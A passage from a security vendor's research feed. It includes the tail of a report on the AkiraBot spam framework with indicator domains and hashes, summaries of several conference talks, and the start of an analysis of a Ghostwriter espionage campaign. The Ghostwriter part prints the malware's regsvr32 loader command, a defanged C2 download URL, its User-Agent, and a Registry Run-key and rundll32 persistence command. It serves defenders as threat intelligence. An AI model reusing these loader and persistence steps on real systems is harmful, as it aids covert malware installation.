<figure id="attachment_117815" aria-describedby="caption-attachment-117815" style="width: 894px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_9.jpg" alt="Screenshot of content on unj[.]digital circa October 2024" width="894" height="672" class="size-full wp-image-117815" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_9.jpg 894w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_9-300x226.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_9-768x577.jpg 768w" sizes="auto, (max-width: 894px) 100vw, 894px" /><figcaption id="caption-attachment-117815" class="wp-caption-text">Screenshot of content on <em>unj[.]digital</em> circa October 2024</figcaption></figure>
<figure id="attachment_117833" aria-describedby="caption-attachment-117833" style="width: 894px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_13.jpg" alt="Screenshot of content on unj[.]digital circa March 2025" width="894" height="672" class="size-full wp-image-117833" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_13.jpg 894w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_13-300x226.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_13-768x577.jpg 768w" sizes="auto, (max-width: 894px) 100vw, 894px" /><figcaption id="caption-attachment-117833" class="wp-caption-text">Screenshot of content on <em>unj[.]digital</em> circa March 2025</figcaption></figure>
<h2>Akira and ServiceWrap SEO</h2>
<p>AkiraBot uses two distinct themes in their SEO offering domain naming conventions: <a href="https://www.trustpilot.com/review/useakira.com" target="_blank" rel="noopener noreferrer">Akira</a> and <a href="https://www.trustpilot.com/review/servicewrapgo.com" target="_blank" rel="noopener noreferrer">ServiceWrap</a>. Reviews for both services on TrustPilot are similar: many 5-star reviews with similar, potentially AI-generated contents, and the occasional 1-star review complaining that the site is either a scam or has spammed the person leaving the review.</p>
<p>The 5-star reviews tend to follow a pattern where the reviewer has one previous review that was made 1-5 days before the Akira or ServiceWrap review. The review themes are very similar across these 5-star reviews, though the contents and structure are always unique. We believe the actor may be generating some fake reviews, though it is difficult to say with certainty.</p>
<p><figure id="attachment_117816" aria-describedby="caption-attachment-117816" style="width: 572px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_8.jpg" alt="Trustpilot review for servicewrapgo[.]com" width="572" height="275" class="size-full wp-image-117816" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_8.jpg 572w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_8-300x144.jpg 300w" sizes="auto, (max-width: 572px) 100vw, 572px" /><figcaption id="caption-attachment-117816" class="wp-caption-text">Trustpilot review for <em>servicewrapgo[.]com</em></figcaption></figure><br />
<figure id="attachment_117825" aria-describedby="caption-attachment-117825" style="width: 572px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_2.jpg" alt="Trustpilot review for useakira[.]com" width="572" height="507" class="size-full wp-image-117825" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_2.jpg 572w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_2-300x266.jpg 300w" sizes="auto, (max-width: 572px) 100vw, 572px" /><figcaption id="caption-attachment-117825" class="wp-caption-text">Trustpilot review for <em>useakira[.]com</em></figcaption></figure><br />
<figure id="attachment_117820" aria-describedby="caption-attachment-117820" style="width: 572px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_3.jpg" alt="Trustpilot review for useakira[.]com" width="572" height="455" class="size-full wp-image-117820" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_3.jpg 572w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_3-300x239.jpg 300w" sizes="auto, (max-width: 572px) 100vw, 572px" /><figcaption id="caption-attachment-117820" class="wp-caption-text">Trustpilot review for useakira[.]com</figcaption></figure></p>
<h2>Conclusion</h2>
<p>AkiraBot is a sprawling framework that has undergone multiple iterations to integrate new spamming target technologies and evade website defenses. We expect this campaign to continue to evolve as website hosting providers adapt defenses to deter spam. The author or authors have invested significant effort in this bot’s ability to bypass commonly used CAPTCHA technologies, which demonstrates that the operators are motivated to violate service provider protections.</p>
<p>AkiraBot’s use of LLM-generated spam message content demonstrates the emerging challenges that AI poses to defending websites against spam attacks. The easiest indicators to block are the rotating set of domains used to sell the Akira and ServiceWrap SEO offerings, as there is no longer a consistent approach in the spam message contents as there were with previous campaigns selling the services of these firms.</p>
<p>SentinelLABS thanks the OpenAI security team for their collaboration and continued efforts in deterring bad actors from abusing their services. The OpenAI team shared the following response following their investigation:</p>
<p><em>“We&#8217;re grateful to SentinelOne for sharing their research. Distributing output from our services for spam is against our policies. The API key involved is disabled, and we’re continuing to investigate and will disable any associated assets. We take misuse seriously and are continually improving our systems to detect abuse.”</em></p>
<h2>Indicators of Compromise</h2>
<p><b>Akira &amp; ServiceWrap Domains</b><br />
akirateam[.]com<br />
beservicewrap[.]pro<br />
firstpageprofs[.]com<br />
getkira[.]info<br />
go-servicewrap[.]com<br />
gogoservicewrap[.]com<br />
goservicewrap[.]com<br />
joinnowkira[.]org<br />
joinnowservicewraps[.]pro<br />
joinservicewrap[.]com<br />
joinuseakira[.]com<br />
kiraone[.]info<br />
letsgetcustomers[.]com<br />
loveservice-wrap[.]com<br />
mybkira[.]info<br />
onlyforyoursite[.]com<br />
searchengineboosters[.]com<br />
service-wrap[.]com<br />
servicewrap-go[.]com<br />
servicewrap[.]pro<br />
servicewrapgo[.]com<br />
servicewrapone[.]com<br />
theakirateam[.]com<br />
toakira[.]pro<br />
topservice-wrap[.]pro<br />
topservicewrap[.]com<br />
usekiara[.]com<br />
useproakira[.]com<br />
usethatakira[.]com<br />
wantkiara[.]info<br />
wearetherealpros[.]com<br />
wejoinkir[.]vip<br />
wethekira[.]shop<br />
wetheservicewrap[.]pro</p>
<p><b>AkiraBot Tool Archive SHA-1</b><br />
09ec44b6d3555a0397142b4308825483b479bf5a<br />
0de065d58b367ffb28ce53bc1dc023f95a6d0b89<br />
13de9fcd4e7c36d32594924975b7ef2b91614556<br />
2322964ea57312747ae9d1e918811201a0c86e9c<br />
253684ea43cb0456a6fec5728e1091ff8fcb27cf<br />
36b4e424ce8082d7606bb9f677f97c0f594f254d<br />
3a443c72995254400da30fe203f3fbf287629969<br />
3a7cc815b921166006f31c1065dadfeb8d5190e6<br />
4d24dd5c166fa471554ed781180e353e6b9642b7<br />
51ec20e5356bbebd43c03faae56fca4c3bbe318e<br />
55affc664472c4657c8534e0508636394eac8828<br />
5620b527dfc71e2ee7efb2e22a0441b60fd67b84<br />
5fde3180373c420cfa5cfdea7f227a1e1fe6936c<br />
62e66bae4b892593009d5261d898356b6d0be3ef<br />
6b65c296d9e1cda5af2f7dab94ce8e163b2a4ca8<br />
6c56b986893dd1de83151510f4b6260613c5fbb9<br />
6f342ff77cd43921210d144a403b8abb1e541a8b<br />
7129194c63ae262c814da8045879aed7a037f196<br />
71464c4f145c9a43ade999d385a9260aabcbf66d<br />
730192b0f62e37d4d57bae9ff14ec8671fbf051e<br />
769aa6ab69154ca87ccba0535e0180a985c21a0c<br />
76aab3ab0f3f16cf30d7913ff767f67a116ff1e7<br />
853fde052316be7887474996538b31f6ac0c3963<br />
9d43494c6f87414c67533cce5ec86754311631fc<br />
9f6ed2427e959e92eb1699024f457d87fa7b5279<br />
aa72065673dc543e6bf627c7479bfe8a5e42a9c4<br />
aac26242f4209bc59c82c8f223fcf2f152ce44bc<br />
b643a1f2c4eb436db26763d5e2527f6bebe8bcbf<br />
bbd754e36aee4702b9f20b90d509248945add4ea<br />
cb194612ed003eaf8d8cf6ed3731f21f3edeb161<br />
cc63ee921c29f47612096c34d6ee3ef244b33db2<br />
e12c6911997d7c2af5550b7e989f1dc57b6733b8<br />
eae675812c4274502051d6f2d36348f77a8464a0<br />
f1c7c5d0870fd0abb7e419f2c2ba8df42fa74667<br />
f2e71c9cbc4a18482a11ca3f54f2c958973360b4<br />
fb7fdcc2fe11e95065a0ce9041348984427ca0f4</p>
]]></content:encoded>
					
		
		
		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot-ftr.jpg" length="614617" type="image/jpeg" />	</item>
		<item>
		<title>LABScon24 Replay &#124; A Walking Red Flag (With Yellow Stars)</title>
		<link>https://www.sentinelone.com/labs/labscon24-replay-a-walking-red-flag-with-yellow-stars/</link>
		
		<dc:creator><![CDATA[LABScon]]></dc:creator>
		<pubDate>Mon, 31 Mar 2025 13:00:23 +0000</pubDate>
				<category><![CDATA[labscon24]]></category>
		<guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&#038;p=115097</guid>

					<description><![CDATA[Dakota Cary and Eugenio Benincasa explore China's CTF ecosystem, highlighting competitions held by the Ministry of State Security and the PLA.]]></description>
										<content:encoded><![CDATA[<p>APT40 used CTFs at Hainan University to recruit hackers and source software vulnerabilities for operations. Jiangsu MSS received vulnerabilities from the Tianfu Cup. iSoon hosted their own CTF before their files were leaked on Github. Chinese intelligence cutouts tried to pitch US participants at RealWorldCTF. The list goes on.</p>
<p>A diverse ecosystem of CTFs exists in China and it has, until now, been largely ignored. Since 2017 when the PRC government issued rules to bolster cybersecurity competitions, incorporate them into talent cultivation and training programs, and limit the amount of money to be paid out in rewards, China’s security ecosystem has launched more than 150 unique competitions. Including competitions that are held annually, the number of events since 2017 exceeds 400.</p>
<p>Not all these competitions are software vulnerability competitions like Tianfu Cup—in fact, few are. Most are aimed at talent cultivation and recruiting, and many are hosted by the military, the intelligence services, or other arms of the state.</p>
<p>This talk explores the diversity of China’s CTF ecosystem, its major leagues and events, and the annual number of participants across society. It highlights competitions held expressly by the Ministry of State Security and the PLA—delving into the competitions’ particulars. Defenders with appropriate CTI collection capabilities will better understand how to target their collection efforts on specific individuals in China.</p>
<p><iframe loading="lazy" src="https://www.youtube.com/embed/YjKsGZkYOsE" width="700" height="392" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
<h2>About the Authors</h2>
<p>Dakota Cary is a strategic advisory consultant at SentinelOne. His reports examine artificial intelligence and cybersecurity research at Chinese universities, the People’s Liberation Army’s efforts to automate software vulnerability discovery, and new policies to improve China’s cybersecurity-talent pipeline. Prior to SentinelOne, he was a research analyst at Georgetown University’s Center for Security and Emerging Technology on the CyberAI Project.</p>
<p>Eugenio Benincasa is a Senior Cyberdefense Researcher at the Center for Security Studies (CSS) at ETH Zurich. Prior to joining CSS, Eugenio worked as a Threat Analyst at the Italian Presidency of the Council of Ministers in Rome and as a Research Fellow at the think tank Pacific Forum in Honolulu, where he focused on cybersecurity issues. He also worked as a Crime Analyst at the New York City Police Department (NYPD).</p>
<h2>About LABScon</h2>
<p>This presentation was featured live at <a href="https://www.labscon.io/" target="_blank" rel="noopener noreferrer">LABScon</a> 2024, an immersive 3-day conference bringing together the world’s top cybersecurity minds, hosted by SentinelOne’s research arm, SentinelLABS.</p>
<p>Keep up with all the latest on <a href="https://www.labscon.io/" target="_blank" rel="noopener noreferrer">LABScon 2025</a> here.</p>
]]></content:encoded>
					
		
		
		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/02/Dakota_LABScon24-ftr.jpg" length="613749" type="image/jpeg" />	</item>
		<item>
		<title>LABScon24 Replay &#124; Kryptina RaaS: From Unsellable Cast-off to Enterprise Ransomware</title>
		<link>https://www.sentinelone.com/labs/labscon24-replay-kryptina-raas-from-unsellable-cast-off-to-enterprise-ransomware/</link>
		
		<dc:creator><![CDATA[LABScon]]></dc:creator>
		<pubDate>Wed, 26 Mar 2025 13:00:16 +0000</pubDate>
				<category><![CDATA[labscon24]]></category>
		<guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&#038;p=115093</guid>

					<description><![CDATA[Jim Walter reveals how a recent leak provided insight into how Kryptina RaaS has been adapted for use in enterprise attacks. ]]></description>
										<content:encoded><![CDATA[<p>Kryptina RaaS is a Linux-focused RaaS platform &amp; service that started life as an unsellable giveaway. However, large-scale ransomware operations are now adopting the platform to extend their reach into Linux and cloud environments.</p>
<p>In this talk, Jim Walter reveals how a recent leak from a Mallox ransomware-affiliated actor’s staging server provided insight into how Kryptina has been adapted for use in enterprise attacks.</p>
<p>The presentation focuses on recent developments and provides an understanding of why threat actors are attracted to the Kryptina platform, and what this means in the context of victims and targeting.</p>
<p>Jim also dissects what was included in the May 2024 Mallox leak and improvements and modifications that threat actors have made to the Kryptina platform.</p>
<p><iframe loading="lazy" src="https://www.youtube.com/embed/SobaTW71C-A" width="700" height="392" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
<h2>About the Author</h2>
<p>Jim Walter is a Senior Threat Researcher at SentinelOne focusing on evolving trends, actors, and tactics within the thriving ecosystem of cybercrime and crimeware. He specializes in the discovery and analysis of emerging cybercrime “services” and evolving communication channels leveraged by mid-level criminal organizations.</p>
<h2>About LABScon</h2>
<p>This presentation was featured live at <a href="https://www.labscon.io/" target="_blank" rel="noopener noreferrer">LABScon</a> 2024, an immersive 3-day conference bringing together the world’s top cybersecurity minds, hosted by SentinelOne’s research arm, SentinelLABS.</p>
<p>Keep up with all the latest on <a href="https://www.labscon.io/" target="_blank" rel="noopener noreferrer">LABScon 2025</a> here.</p>
]]></content:encoded>
					
		
		
		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/02/Jim-LABScon24-ftr.jpg" length="73546" type="image/jpeg" />	</item>
		<item>
		<title>LABScon24 Replay &#124; Resilience and Protection in the Windows Ecosystem</title>
		<link>https://www.sentinelone.com/labs/labscon24-replay-resilience-and-protection-in-the-windows-ecosystem/</link>
		
		<dc:creator><![CDATA[LABScon]]></dc:creator>
		<pubDate>Wed, 12 Mar 2025 13:00:47 +0000</pubDate>
				<category><![CDATA[labscon24]]></category>
		<guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&#038;p=115081</guid>

					<description><![CDATA[Kim Zetter interviews David Weston on topics such as the fallout from the CrowdStrike outage, Windows Recall and improving Microsoft security. ]]></description>
										<content:encoded><![CDATA[<p>In this exclusive interview at LABScon 2024, award-winning investigative journalist Kim Zetter and Microsoft Corporate VP Enterprise and OS Security David Weston discuss Microsoft kernel security, the CrowdStrike outage, AI, and how Microsoft plans to improve the resilience and security of the Windows ecosystem.</p>
<p>As the world&#8217;s data has increasingly become associated with Microsoft infrastructure and exposed to Microsoft products, threat actors have focused their efforts on exploiting security weaknesses in the vendor&#8217;s operating system. Weston and Zetter explore how this has led Microsoft to raise the priority of security at the engineering level, even at the expense of curtailing operating system features.</p>
<p>In addition, the conversation ranges over how the CrowdStrike outage of 2024 led Microsoft to a new focus on resilience and to the development of a user mode API to restrict access to the kernel to third party products. Weston also discusses the need for security vendors to implement secure deployment practices to better protect customers from rogue updates and tackles questions around the use of AI and the controversial Windows Recall feature.</p>
<p><iframe loading="lazy" src="https://www.youtube.com/embed/7ne9e0YUrQI" width="700" height="392" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
<h2>About the Authors</h2>
<p><a href="https://www.linkedin.com/in/dwizzzle/" target="_blank" rel="noopener noreferrer">David Weston</a> is Corporate Vice President, Enterprise and OS Security at Microsoft where he is responsible for the security engineering of Windows, Azure Linux, XBOX, Windows Server, the Azure OS as well as the Offensive Security Research &amp; Engineering Team.</p>
<p><a href="https://www.zetter-zeroday.com/" target="_blank" rel="noopener noreferrer">Kim Zetter</a> is an award-winning investigative journalist who has covered cybersecurity and national security for more than a decade, most notably for WIRED, where she wrote for thirteen years, and more recently for the New York Times Magazine, Politico, Washington Post, Motherboard, and Yahoo News. She has been voted one of the top ten security journalists in the country by security professionals and her journalism peers.</p>
<h2>About LABScon</h2>
<p>This presentation was featured live at <a href="https://www.labscon.io/" target="_blank" rel="noopener noreferrer">LABScon</a> 2024, an immersive 3-day conference bringing together the world’s top cybersecurity minds, hosted by SentinelOne’s research arm, SentinelLABS.</p>
<p>Keep up with all the latest on <a href="https://www.labscon.io/" target="_blank" rel="noopener noreferrer">LABScon 2025</a> here.</p>
]]></content:encoded>
					
		
		
		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/02/weston-ftr.jpg" length="596345" type="image/jpeg" />	</item>
		<item>
		<title>LABScon24 Replay &#124; Farmyard Gossip: The Foreign Footprint in US Agriculture</title>
		<link>https://www.sentinelone.com/labs/labscon24-replay-farmyard-gossip-the-foreign-footprint-in-us-agriculture/</link>
		
		<dc:creator><![CDATA[LABScon]]></dc:creator>
		<pubDate>Wed, 05 Mar 2025 14:00:02 +0000</pubDate>
				<category><![CDATA[labscon24]]></category>
		<guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&#038;p=115077</guid>

					<description><![CDATA[Kristin Del Rosso &#038; Madeleine Devost explore the growing trend of foreign ownership of farmland and its implications for national security.]]></description>
										<content:encoded><![CDATA[<p>Who really owns America’s farmland, and why does it matter? In this deep dive into the secretive world of foreign investment in U.S. agricultural land, Kristin Del Rosso and Madeleine Devost explore the growing trend of foreign ownership, which has surged by 50% since 2017, and its profound implications for national security. Using the USDA’s data, the presenters shed light on how these investments could potentially impact everything from local economies to national defense.</p>
<p>The talk dives into the complexities of the USDA’s data collection methods, revealing how manual processes and outdated systems obscure the true extent of foreign ownership. It also discusses the critical role of the Committee on Foreign Investment in the United States (CFIUS) in safeguarding national interests, and the urgent need for improved data sharing and automation between CFIUS and the USDA.</p>
<p>Through real-life examples, including controversial land purchases near sensitive military sites, Kristin and Madeleine illustrate the potential risks and propose actionable recommendations to enhance transparency and security.</p>
<p><iframe loading="lazy" src="https://www.youtube.com/embed/0rsgZfj6MGE" width="700" height="392" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
<h2>About the Authors</h2>
<p><a href="https://www.linkedin.com/in/kristindelrosso/" target="_blank" rel="noopener noreferrer">Kristin Del Rosso</a> is co-founder and managing director of DevSec, a research firm that provides advanced analytics blended with cyber investigation techniques to support analytics, investigations, and intelligence enrichment in novel ways. Prior to DevSec, she worked as the Public Sector Field CTO at Sophos, and has a background in security product management, threat intelligence, and reverse engineering.</p>
<p><a href="https://www.linkedin.com/in/madeleine-d-338805186/" target="_blank" rel="noopener noreferrer">Madeleine Devost</a> is an intelligence analyst at Nisos focusing on open-source investigations. Prior to Nisos, she worked as a threat intelligence and investigations consultant for a number of firms including Excivity, RiskIQ and Microsoft.</p>
<h2>About LABScon</h2>
<p>This presentation was featured live at <a href="https://www.labscon.io/" target="_blank" rel="noopener noreferrer">LABScon</a> 2024, an immersive 3-day conference bringing together the world’s top cybersecurity minds, hosted by SentinelOne’s research arm, SentinelLABS.</p>
<p>Keep up with all the latest on <a href="https://www.labscon.io/" target="_blank" rel="noopener noreferrer">LABScon 2025</a> here.</p>
]]></content:encoded>
					
		
		
		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/02/farmyard_gossip-ftr.jpg" length="576096" type="image/jpeg" />	</item>
		<item>
		<title>Ghostwriter &#124; New Campaign Targets Ukrainian Government and Belarusian Opposition</title>
		<link>https://www.sentinelone.com/labs/ghostwriter-new-campaign-targets-ukrainian-government-and-belarusian-opposition/</link>
		
		<dc:creator><![CDATA[Tom Hegel]]></dc:creator>
		<pubDate>Tue, 25 Feb 2025 10:55:52 +0000</pubDate>
				<category><![CDATA[Belarus]]></category>
		<category><![CDATA[Russia]]></category>
		<category><![CDATA[Ukraine]]></category>
		<guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&#038;p=114319</guid>

					<description><![CDATA[Latest Ghostwriter campaign brings Belarusian opposition into its sights for the first time as it continues weaponizing XLS docs to drop malware.]]></description>
										<content:encoded><![CDATA[<h2>Executive Summary</h2>
<ul>
<li aria-level="1">SentinelLABS has observed a campaign targeting opposition activists in Belarus as well as Ukrainian military and government organizations.</li>
<li aria-level="1">The campaign has been in preparation since July-August 2024 and entered the active phase in November-December 2024.</li>
<li aria-level="1">Recent malware samples and command-and-control (C2) infrastructure activity indicate that the operation remains active in recent days.</li>
<li aria-level="1">SentinelLABS assesses that this cluster of threat activity is an extension of the long-running Ghostwriter campaign identified in previous public reporting.</li>
</ul>
<h2>Ghostwriter | Background</h2>
<p>Ghostwriter is a long-running campaign likely active since 2016 and subsequently described in various public reports throughout 2020 to 2024. The actor behind Ghostwriter campaigns is closely linked with Belarusian government espionage efforts, while most commonly reported under the APT names <a href="https://cloud.google.com/blog/topics/threat-intelligence/unc1151-linked-to-belarus-government/" target="_blank" rel="noopener noreferrer">UNC1151</a> (Mandiant) or <a href="https://cert.gov.ua/search/UAC-0057" target="_blank" rel="noopener noreferrer">UAC-0057</a> (CERT-UA). Some public reports may use the term &#8220;Ghostwriter APT&#8221; interchangeably to refer to both the threat actor and its associated campaigns.</p>
<p>Previous <a href="https://www.cardiff.ac.uk/__data/assets/pdf_file/0005/2699483/Ghostwriter-Report-Final.pdf" target="_blank" rel="noopener noreferrer">research</a> on the evolution of Ghostwriter noted how it operated successfully across a range of platforms, blending information manipulation with hacking to target a number of European countries. Reporting throughout 2022 to 2024 described <a href="https://cert.gov.ua/article/6280159" target="_blank" rel="noopener noreferrer">activity</a> in which malicious Excel documents were used to deliver PicassoLoader and Cobalt Strike payloads. Observed document lures were themed around issues pertaining to the Ukraine military and the <a href="https://cyble.com/blog/unc1151-strikes-again-unveiling-their-tactics-against-ukraines-ministry-of-defence/" target="_blank" rel="noopener noreferrer">likely targeting</a> of the Ministry of Defense.</p>
<p>SentinelLABS has observed new activity with multiple weaponized Excel documents containing lures pertaining to the interests of the Ukraine government, the Ukraine military and domestic Belarusian opposition. While some of the TTPs we have observed overlap with previous reporting, others are new, including adaptations of previously observed payloads such as PicassoLoader.</p>
<h2>Weaponized XLS 1 | &#8220;Political Prisoners in Minsk Courts&#8221;</h2>
<p>SentinelLABS analyzed an attack that started with a Google Drive shared document landing in the target’s inbox. The email originated from an account using the name “Vladimir Nikiforech” (<code>vladimir.nikiforeach@gmail[.]com</code>). The email link pointed to a downloadable RAR archive, which according to the internal timestamps was created on 2025-01-14 00:47:54, containing a malicious Excel workbook (<code>ebb30fd99c2e6cbae392c337df5876759e53730d</code>) with the file name <code>политзаключенные(по судам минска).xls</code> (“Political prisoners (across courts of Minsk).xls”).</p>
<p>The title of the lure indicates an interesting shift in Ghostwriter targeting. Although attribution for the 2021 Ghostwriter campaign <a href="https://www.cardiff.ac.uk/__data/assets/pdf_file/0005/2699483/Ghostwriter-Report-Final.pdf" target="_blank" rel="noopener noreferrer">pointed to</a> the Belarus state, this is the first time we have seen lures directly aimed at Belarus government opposition. The timing of the attack could have been motivated by the presidential election that <a href="https://en.wikipedia.org/wiki/2025_Belarusian_presidential_election" target="_blank" rel="noopener noreferrer">took place</a> shortly after on Jan 26, 2025.</p>
<p>The XLS document contains an obfuscated VBA macro which is activated when the document is opened and the user allows Office macros to run.</p>
<figure id="attachment_114850" aria-describedby="caption-attachment-114850" style="width: 1837px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_3.jpg" alt="Obfuscated macro inside the XLS spreadsheet" width="1837" height="752" class="size-full wp-image-114850" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_3.jpg 1837w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_3-300x123.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_3-1024x419.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_3-768x314.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_3-1536x629.jpg 1536w" sizes="auto, (max-width: 1837px) 100vw, 1837px" /><figcaption id="caption-attachment-114850" class="wp-caption-text">Obfuscated macro inside the XLS spreadsheet</figcaption></figure>
<p>On execution, the macro writes a file to <code>%Temp%\Realtek(r)Audio.dll</code>.</p>
<p>The DLL file is loaded with the following command line invocation:</p>
<pre>
C:\Windows\System32\regsvr32.exe /u /s "C:\Temp\Realtek(r)Audio.dll”
</pre>
<p>This starts the standard Windows process <code>regsvr32.exe</code>, which calls the <code>DllUnregisterServer</code> function implemented inside the DLL; the function then loads and executes the .NET assembly described next.</p>
<p>Analysis of <code>Dwnldr.dll</code> shows that it is a DLL file with a .NET assembly embedded inside. The file is protected with <a href="https://mkaring.github.io/ConfuserEx/" target="_blank" rel="noopener noreferrer">ConfuserEx</a> &#8211; a publicly available tool that helps to obfuscate .NET programs and observed in previous Ghostwriter campaigns.</p>
<p>The DLL file hosts a payload that appears to be a simplified variant of PicassoDownloader, a malware family also linked to Ghostwriter activity. The internal filename (<code>Dwnldr.dll</code>) was previously used by the Ghostwriter threat actor; however, this variant bears only high-level similarities to previous versions, with significant changes to the underlying code, possibly to make it a cheaper and more expendable tool.</p>
<p>As a part of application protection provided by the obfuscator, the Downloader creates a copy of itself in memory, and then modifies it. It does so by decrypting additional code of the assembly. It also uses a clever evasion technique, altering its own PE header in memory and breaking internal links to the .NET assembly. This makes it impossible for security products to parse it as a .NET module.</p>
<p>During code execution, after the protection layer passes control to core functionality, the Downloader writes a decoy Excel workbook file to <code>%AppData%\Roaming\Microsoft\temp.xlsx</code> and downloads additional file(s) from the Web.</p>
<p>The <code>temp.xlsx</code> decoy file (<code>18151b3801bd716b5a33cfc85dbdc4ba84a00314</code>) is immediately opened in Excel in an attempt to make the victim believe that it contains the original content of the <code>политзаключенные (по судам минска).xls</code> file.</p>
<figure id="attachment_114854" aria-describedby="caption-attachment-114854" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_11.jpg" alt="Decoy document containing lists of people with criminal charges, prosecutors’ and judges’ names" width="1999" height="803" class="size-full wp-image-114854" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_11.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_11-300x121.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_11-1024x411.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_11-768x309.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_11-1536x617.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-114854" class="wp-caption-text">Decoy document containing lists of people with criminal charges, prosecutors’ and judges’ names</figcaption></figure>
<p>The spreadsheet contains the names of people with criminal charges along with the names of prosecutors and judges: content that invites the reader to believe it could be leaked from a government source. However, the information was already in the public domain and can be found on the website of a proscribed Belarusian human rights organization, <a href="https://prisoners.spring96.org/ru/list" target="_blank" rel="noopener noreferrer">Spring96</a>.</p>
<p>Once the decoy Excel file is opened, the Downloader attempts to fetch the next stage from the following URL:</p>
<pre>
https://everythingandthedog[.]shop/petsblog/2020/2/25/tips-for-taking-difficult-dogs-on-a-walk.jpg
</pre>
<figure id="attachment_114852" aria-describedby="caption-attachment-114852" style="width: 720px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_13.jpg" alt="The JPG image file fetched from the C2" width="720" height="960" class="size-full wp-image-114852" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_13.jpg 720w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_13-225x300.jpg 225w" sizes="auto, (max-width: 720px) 100vw, 720px" /><figcaption id="caption-attachment-114852" class="wp-caption-text">The JPG image file fetched from the C2</figcaption></figure>
<p>We note that the <code>.shop</code> top level domain was also reported in other Ghostwriter activity seen in 2024.</p>
<p>When the malware issues the HTTP request, it uses a hardcoded User-Agent string:</p>
<pre>
Mozilla/5.0 (<b>Macintosh; Intel Mac OS X 10_15_7</b>) AppleWebKit/555.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
</pre>
<p>The fetched file (<code>8d2bb96e69df059f279d97989690ce3e556a8318</code>) is a benign JPEG file, originating from publicly available photo stock, with no extra payload or any hidden cave where code could be embedded. We confirmed that an identical file can be found online, located on a web site that is nearly identical to the one used by attackers. It would seem the attackers not only reused the JPG file contents from a legitimate website but also copied its original URL, changing only the top level domain:</p>
<pre>
https://www.everythingandthedog<b>.com</b>/petsblog/2020/2/25/tips-for-taking-difficult-dogs-on-a-walk.
</pre>
<p>Once the file is downloaded, it is renamed and then saved to <code>%APPDATA%\Roaming\Microsoft\SystemCertificates\CertificateCenter.dll</code>.</p>
<p>Later, it is registered to load during autostart by leveraging the Registry Run key:</p>
<pre>
HKCU\System\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft Certificate Center
</pre>
<p>with its value pointing to expanded environment variable string:</p>
<pre>
rundll32.exe C:\Users\<Username>\AppData\Roaming\Microsoft\SystemCertificates\CertificateCenter.dll,#1
</pre>
<p>This Registry entry makes <code>rundll32.exe</code> load the DLL and execute its exported function with ordinal 1 whenever a user logs on.</p>
